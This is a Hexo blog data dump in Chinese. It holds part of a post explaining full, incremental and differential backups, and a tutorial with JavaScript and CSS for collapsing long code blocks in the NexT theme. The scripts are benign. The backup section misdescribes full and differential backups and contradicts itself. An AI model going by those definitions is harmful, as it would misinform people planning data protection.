Backup）</h3><ul>\n<li>完整备份是最基本的备份类型。它会备份所有选定的数据和文件，包括整个文件系统或指定的目录。</li>\n<li>第一次完整备份通常需要时间较长，因为它备份了所有数据。</li>\n<li>后续的完整备份通常只会备份自上次完整备份以来更改的数据。</li>\n<li>完整备份的优点是恢复速度快，因为它包含了所有数据，但缺点是需要更多的存储空间。</li>\n</ul>\n<h3 id=\"增量备份（Incremental-Backup）\"><a href=\"#增量备份（Incremental-Backup）\" class=\"headerlink\" title=\"增量备份（Incremental Backup）\"></a>增量备份（Incremental Backup）</h3><ul>\n<li>增量备份只备份自上次备份以来发生更改的数据。它记录了每个备份的时间点，并备份自上次备份后新添加或修改的文件。</li>\n<li>第一次增量备份通常与完整备份相似，备份所有数据。</li>\n<li>后续的增量备份只备份自上次增量备份以来更改的数据。</li>\n<li>增量备份通常需要较少的存储空间，但在恢复时需要多个备份集合。</li>\n</ul>\n<h3 id=\"差异备份（Differential-Backup）\"><a href=\"#差异备份（Differential-Backup）\" class=\"headerlink\" title=\"差异备份（Differential Backup）\"></a>差异备份（Differential Backup）</h3><ul>\n<li>差异备份备份自上次完整备份以来发生更改的数据，而不是自上次备份以来的所有更改。</li>\n<li>第一次差异备份通常与完整备份相似，备份所有数据。</li>\n<li>后续的差异备份只备份自上次差异备份以来更改的数据，而不是自上次完整备份以来的所有更改。</li>\n<li>差异备份需要较少的存储空间，比完整备份更快，但比增量备份需要更多的存储空间。</li>\n</ul>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><ul>\n<li>完整备份备份所有数据，恢复速度快，但需要更多的存储空间。</li>\n<li>增量备份备份自上次备份以来的更改，存储空间较少，但需要多个备份集合来恢复。</li>\n<li>差异备份备份自上次完整备份以来的更改，存储空间较少，恢复速度相对较快。</li>\n</ul>\n<p>选择备份类型取决于存储需求、恢复时间和备份策略。通常，组合使用完整备份和增量或差异备份可以提供有效的数据保护策略。</p>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<p>备份是一种数据保护策略，它旨在防止数据丢失或恢复已丢失的数据。在备份中，有三种常见的备份类型：完整备份、增量备份和差异备份。以下是对这三种备份类型的详细解释：</p>","more":"<h3 id=\"完整备份（Full-Backup）\"><a href=\"#完整备份（Full-Backup）\" class=\"headerlink\" title=\"完整备份（Full Backup）\"></a>完整备份（Full Backup）</h3><ul>\n<li>完整备份是最基本的备份类型。它会备份所有选定的数据和文件，包括整个文件系统或指定的目录。</li>\n<li>第一次完整备份通常需要时间较长，因为它备份了所有数据。</li>\n<li>后续的完整备份通常只会备份自上次完整备份以来更改的数据。</li>\n<li>完整备份的优点是恢复速度快，因为它包含了所有数据，但缺点是需要更多的存储空间。</li>\n</ul>\n<h3 id=\"增量备份（Incremental-Backup）\"><a href=\"#增量备份（Incremental-Backup）\" class=\"headerlink\" title=\"增量备份（Incremental Backup）\"></a>增量备份（Incremental Backup）</h3><ul>\n<li>增量备份只备份自上次备份以来发生更改的数据。它记录了每个备份的时间点，并备份自上次备份后新添加或修改的文件。</li>\n<li>第一次增量备份通常与完整备份相似，备份所有数据。</li>\n<li>后续的增量备份只备份自上次增量备份以来更改的数据。</li>\n<li>增量备份通常需要较少的存储空间，但在恢复时需要多个备份集合。</li>\n</ul>\n<h3 id=\"差异备份（Differential-Backup）\"><a href=\"#差异备份（Differential-Backup）\" class=\"headerlink\" title=\"差异备份（Differential Backup）\"></a>差异备份（Differential Backup）</h3><ul>\n<li>差异备份备份自上次完整备份以来发生更改的数据，而不是自上次备份以来的所有更改。</li>\n<li>第一次差异备份通常与完整备份相似，备份所有数据。</li>\n<li>后续的差异备份只备份自上次差异备份以来更改的数据，而不是自上次完整备份以来的所有更改。</li>\n<li>差异备份需要较少的存储空间，比完整备份更快，但比增量备份需要更多的存储空间。</li>\n</ul>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><ul>\n<li>完整备份备份所有数据，恢复速度快，但需要更多的存储空间。</li>\n<li>增量备份备份自上次备份以来的更改，存储空间较少，但需要多个备份集合来恢复。</li>\n<li>差异备份备份自上次完整备份以来的更改，存储空间较少，恢复速度相对较快。</li>\n</ul>\n<p>选择备份类型取决于存储需求、恢复时间和备份策略。通常，组合使用完整备份和增量或差异备份可以提供有效的数据保护策略。</p>"},{"title":"设置博客折叠代码","date":"2023-09-09T10:29:34.000Z","_content":"\n有些时候经常会遇到博客中很长的代码段，占据半个甚至整个屏幕，此时就非常需要将代码段进行折叠，以此来缓解代码块影响阅读的问题。\n\n配置走起！\n\n<!-- more -->\n\n### 配置步骤\n\n1. 取消注释\n\n打开`themes\\next\\_config.yml`文件。   \n<kbd>CTRL</kbd>+<kbd>F</kbd>查找关键字“custom_file_path”(如果你使用的是VS-CODE编辑器)。   \n取消`bodyEnd: source/_data/body-end.njk`注释和`style: source/_data/styles.styl`注释。\n\n```yml 折叠代码\ncustom_file_path:\n  #head: source/_data/head.njk\n  #header: source/_data/header.njk\n  #sidebar: source/_data/sidebar.njk\n  #postMeta: source/_data/post-meta.njk\n  #postBodyEnd: source/_data/post-body-end.njk\n  footer: source/_data/footer.swig\n  bodyEnd: source/_data/body-end.njk\n  variable: source/_data/variables.styl\n  #mixin: source/_data/mixins.styl\n  style: source/_data/styles.styl\n```\n\n2. 按照`style`的路径和`bodyEnd`的路径添加相应的文件，如果当前不存在此文件的话。如果已经存在的话，添加以下配置。\n\n* 首先添加`bodyEnd`文件的内容\n\n```js 折叠代码\n<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 11\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>\n```\n\nPS：在代码的第11行，可以按照自己的需要进行设置，当代码超过多少行时，折叠代码的JS生效。\n\n* 然后修改`style`文件内容，在文件的末尾添加：\n\n```yml\n/* 代码块隐藏 */\n.code-hidden {\n    display: none;\n}\n```\n\n* 使用案例\n\n````bash\n```bash 折叠代码\n/* some code */\n```\n````\n\n完成的效果就像添加JS代码的代码块一样。\n\n### 补充\n\n已经取消注释的文件对应的功能和教程链接。\n\n|文件|功能|\n|:---:|:---:|\n|footer|**[背景\"小飞棍\"](https://nustarain.gitee.io/2023/07/17/FlyLine/)**|\n|bodyEnd|**[折叠代码](https://nustarain.gitee.io/2023/09/09/blog-FoldCode/)**|\n|variable|**[设置圆角](https://nustarain.gitee.io/2023/09/09/blog-fillet/)**|\n|style|**[背景图片](https://nustarain.gitee.io/2023/07/17/BGPic/)**、**[博客透明度](https://nustarain.gitee.io/2023/09/09/blog-transparency/)**、**[折叠代码](https://nustarain.gitee.io/2023/09/09/blog-FoldCode/)**|","source":"_posts/blog-FoldCode.md","raw":"---\ntitle: 设置博客折叠代码\ndate: 2023-09-09 18:29:34\ncategories: 博客搭建\ntags:\n  - 博客美化\n---\n\n有些时候经常会遇到博客中很长的代码段，占据半个甚至整个屏幕，此时就非常需要将代码段进行折叠，以此来缓解代码块影响阅读的问题。\n\n配置走起！\n\n<!-- more -->\n\n### 配置步骤\n\n1. 取消注释\n\n打开`themes\\next\\_config.yml`文件。   \n<kbd>CTRL</kbd>+<kbd>F</kbd>查找关键字“custom_file_path”(如果你使用的是VS-CODE编辑器)。   \n取消`bodyEnd: source/_data/body-end.njk`注释和`style: source/_data/styles.styl`注释。\n\n```yml 折叠代码\ncustom_file_path:\n  #head: source/_data/head.njk\n  #header: source/_data/header.njk\n  #sidebar: source/_data/sidebar.njk\n  #postMeta: source/_data/post-meta.njk\n  #postBodyEnd: source/_data/post-body-end.njk\n  footer: source/_data/footer.swig\n  bodyEnd: source/_data/body-end.njk\n  variable: source/_data/variables.styl\n  #mixin: source/_data/mixins.styl\n  style: source/_data/styles.styl\n```\n\n2. 按照`style`的路径和`bodyEnd`的路径添加相应的文件，如果当前不存在此文件的话。如果已经存在的话，添加以下配置。\n\n* 首先添加`bodyEnd`文件的内容\n\n```js 折叠代码\n<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 11\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>\n```\n\nPS：在代码的第11行，可以按照自己的需要进行设置，当代码超过多少行时，折叠代码的JS生效。\n\n* 然后修改`style`文件内容，在文件的末尾添加：\n\n```yml\n/* 代码块隐藏 */\n.code-hidden {\n    display: none;\n}\n```\n\n* 使用案例\n\n````bash\n```bash 折叠代码\n/* some code */\n```\n````\n\n完成的效果就像添加JS代码的代码块一样。\n\n### 补充\n\n已经取消注释的文件对应的功能和教程链接。\n\n|文件|功能|\n|:---:|:---:|\n|footer|**[背景\"小飞棍\"](https://nustarain.gitee.io/2023/07/17/FlyLine/)**|\n|bodyEnd|**[折叠代码](https://nustarain.gitee.io/2023/09/09/blog-FoldCode/)**|\n|variable|**[设置圆角](https://nustarain.gitee.io/2023/09/09/blog-fillet/)**|\n|style|**[背景图片](https://nustarain.gitee.io/2023/07/17/BGPic/)**、**[博客透明度](https://nustarain.gitee.io/2023/09/09/blog-transparency/)**、**[折叠代码](https://nustarain.gitee.io/2023/09/09/blog-FoldCode/)**|","slug":"blog-FoldCode","published":1,"updated":"2024-05-03T03:55:54.829Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5es00467zj384st54s9","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>有些时候经常会遇到博客中很长的代码段，占据半个甚至整个屏幕，此时就非常需要将代码段进行折叠，以此来缓解代码块影响阅读的问题。</p>\n<p>配置走起！</p>\n<span id=\"more\"></span>\n\n<h3 id=\"配置步骤\"><a href=\"#配置步骤\" class=\"headerlink\" title=\"配置步骤\"></a>配置步骤</h3><ol>\n<li>取消注释</li>\n</ol>\n<p>打开<code>themes\\next\\_config.yml</code>文件。<br><kbd>CTRL</kbd>+<kbd>F</kbd>查找关键字“custom_file_path”(如果你使用的是VS-CODE编辑器)。<br>取消<code>bodyEnd: source/_data/body-end.njk</code>注释和<code>style: source/_data/styles.styl</code>注释。</p>\n<figure class=\"highlight yml\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">custom_file_path:</span></span><br><span class=\"line\">  <span class=\"comment\">#head: source/_data/head.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#header: source/_data/header.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#sidebar: source/_data/sidebar.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#postMeta: source/_data/post-meta.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#postBodyEnd: source/_data/post-body-end.njk</span></span><br><span class=\"line\">  <span class=\"attr\">footer:</span> <span class=\"string\">source/_data/footer.swig</span></span><br><span class=\"line\">  <span class=\"attr\">bodyEnd:</span> <span class=\"string\">source/_data/body-end.njk</span></span><br><span class=\"line\">  <span class=\"attr\">variable:</span> <span class=\"string\">source/_data/variables.styl</span></span><br><span class=\"line\">  <span class=\"comment\">#mixin: source/_data/mixins.styl</span></span><br><span class=\"line\">  <span class=\"attr\">style:</span> <span class=\"string\">source/_data/styles.styl</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>按照<code>style</code>的路径和<code>bodyEnd</code>的路径添加相应的文件，如果当前不存在此文件的话。如果已经存在的话，添加以下配置。</li>\n</ol>\n<ul>\n<li>首先添加<code>bodyEnd</code>文件的内容</li>\n</ul>\n<figure class=\"highlight js\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">  <span class=\"variable language_\">document</span>.<span class=\"title function_\">addEventListener</span>(<span class=\"string\">&quot;DOMContentLoaded&quot;</span>, <span class=\"keyword\">function</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 查找所有 div.table-container 元素</span></span><br><span class=\"line\">    <span class=\"keyword\">const</span> tableContainers = <span class=\"variable language_\">document</span>.<span class=\"title function_\">querySelectorAll</span>(<span class=\"string\">&quot;.table-container&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 遍历所有 div.table-container 元素</span></span><br><span class=\"line\">    tableContainers.<span class=\"title function_\">forEach</span>(<span class=\"keyword\">function</span>(<span class=\"params\">tableContainer</span>) &#123;</span><br><span class=\"line\">      <span class=\"comment\">// 获取 div.table-container 内的 span 元素数量</span></span><br><span class=\"line\">      <span class=\"keyword\">const</span> spanCount = tableContainer.<span class=\"title function_\">querySelectorAll</span>(<span class=\"string\">&quot;tbody &gt; tr &gt; td.code &gt; pre &gt; span&quot;</span>).<span class=\"property\">length</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">// 检查 span 元素数量是否 &gt;= 11</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (spanCount &gt;= <span class=\"number\">11</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个</span></span><br><span class=\"line\">        <span class=\"keyword\">const</span> prevElement = tableContainer.<span class=\"property\">previousElementSibling</span>;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> figcaption;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> iElement;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!prevElement || prevElement.<span class=\"property\">tagName</span>.<span class=\"title function_\">toLowerCase</span>() !== <span class=\"string\">&quot;figcaption&quot;</span>) &#123;</span><br><span class=\"line\">          <span class=\"comment\">// 在 div.table-container 前插入一个 figcaption 元素</span></span><br><span class=\"line\">          figcaption = <span class=\"variable language_\">document</span>.<span class=\"title function_\">createElement</span>(<span class=\"string\">&quot;figcaption&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">          <span class=\"comment\">// 将 figcaption 插入到 DOM 中</span></span><br><span class=\"line\">          tableContainer.<span class=\"property\">parentNode</span>.<span class=\"title function_\">insertBefore</span>(figcaption, tableContainer);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">          figcaption = prevElement;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 创建一个 &lt;i&gt; 标签并添加功能</span></span><br><span class=\"line\">        iElement = <span class=\"variable language_\">document</span>.<span class=\"title function_\">createElement</span>(<span class=\"string\">&quot;i&quot;</span>);</span><br><span class=\"line\">        iElement.<span class=\"property\">className</span> = <span class=\"string\">&quot;fas fa-angle-down&quot;</span>;</span><br><span class=\"line\">        <span class=\"comment\">// 插入一点空格</span></span><br><span class=\"line\">        iElement.<span class=\"property\">innerHTML</span> = <span class=\"string\">&quot;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span>;</span><br><span class=\"line\">        figcaption.<span class=\"title function_\">insertBefore</span>(iElement, figcaption.<span class=\"property\">firstChild</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 为 &lt;i&gt; 标签添加点击事件</span></span><br><span class=\"line\">        iElement.<span class=\"title function_\">addEventListener</span>(<span class=\"string\">&quot;click&quot;</span>, <span class=\"keyword\">function</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">          <span class=\"comment\">// 切换 tableContainer 的 &quot;code-hidden&quot; 类</span></span><br><span class=\"line\">          tableContainer.<span class=\"property\">classList</span>.<span class=\"title function_\">toggle</span>(<span class=\"string\">&quot;code-hidden&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">          <span class=\"comment\">// 切换 &lt;i&gt; 标签的类名</span></span><br><span class=\"line\">          <span class=\"keyword\">if</span> (iElement.<span class=\"property\">classList</span>.<span class=\"title function_\">contains</span>(<span class=\"string\">&quot;fa-angle-down&quot;</span>)) &#123;</span><br><span class=\"line\">            iElement.<span class=\"property\">classList</span>.<span class=\"title function_\">remove</span>(<span class=\"string\">&quot;fa-angle-down&quot;</span>);</span><br><span class=\"line\">            iElement.<span class=\"property\">classList</span>.<span class=\"title function_\">add</span>(<span class=\"string\">&quot;fa-angle-right&quot;</span>);</span><br><span class=\"line\">          &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            iElement.<span class=\"property\">classList</span>.<span class=\"title function_\">remove</span>(<span class=\"string\">&quot;fa-angle-right&quot;</span>);</span><br><span class=\"line\">            iElement.<span class=\"property\">classList</span>.<span class=\"title function_\">add</span>(<span class=\"string\">&quot;fa-angle-down&quot;</span>);</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n\n<p>PS：在代码的第11行，可以按照自己的需要进行设置，当代码超过多少行时，折叠代码的JS生效。</p>\n<ul>\n<li>然后修改<code>style</code>文件内容，在文件的末尾添加：</li>\n</ul>\n<figure class=\"highlight yml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">/*</span> <span class=\"string\">代码块隐藏</span> <span class=\"string\">*/</span></span><br><span class=\"line\"><span class=\"string\">.code-hidden</span> &#123;</span><br><span class=\"line\">    <span class=\"attr\">display:</span> <span class=\"string\">none;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>使用案例</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">```bash 折叠代码</span><br><span class=\"line\">/* some code */</span><br><span class=\"line\">```</span><br></pre></td></tr></table></figure>\n\n<p>完成的效果就像添加JS代码的代码块一样。</p>\n<h3 id=\"补充\"><a href=\"#补充\" class=\"headerlink\" title=\"补充\"></a>补充</h3><p>已经取消注释的文件对应的功能和教程链接。</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">文件</th>\n<th align=\"center\">功能</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">footer</td>\n<td align=\"center\"><strong><a href=\"https://nustarain.gitee.io/2023/07/17/FlyLine/\">背景”小飞棍”</a></strong></td>\n</tr>\n<tr>\n<td align=\"center\">bodyEnd</td>\n<td align=\"center\"><strong><a href=\"https://nustarain.gitee.io/2023/09/09/blog-FoldCode/\">折叠代码</a></strong></td>\n</tr>\n<tr>\n<td align=\"center\">variable</td>\n<td align=\"center\"><strong><a href=\"https://nustarain.gitee.io/2023/09/09/blog-fillet/\">设置圆角</a></strong></td>\n</tr>\n<tr>\n<td align=\"center\">style</td>\n<td align=\"center\"><strong><a href=\"https://nustarain.gitee.io/2023/07/17/BGPic/\">背景图片</a><strong>、</strong><a href=\"https://nustarain.gitee.io/2023/09/09/blog-transparency/\">博客透明度</a><strong>、</strong><a href=\"https://nustarain.gitee.io/2023/09/09/blog-FoldCode/\">折叠代码</a></strong></td>\n</tr>\n</tbody></table>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas 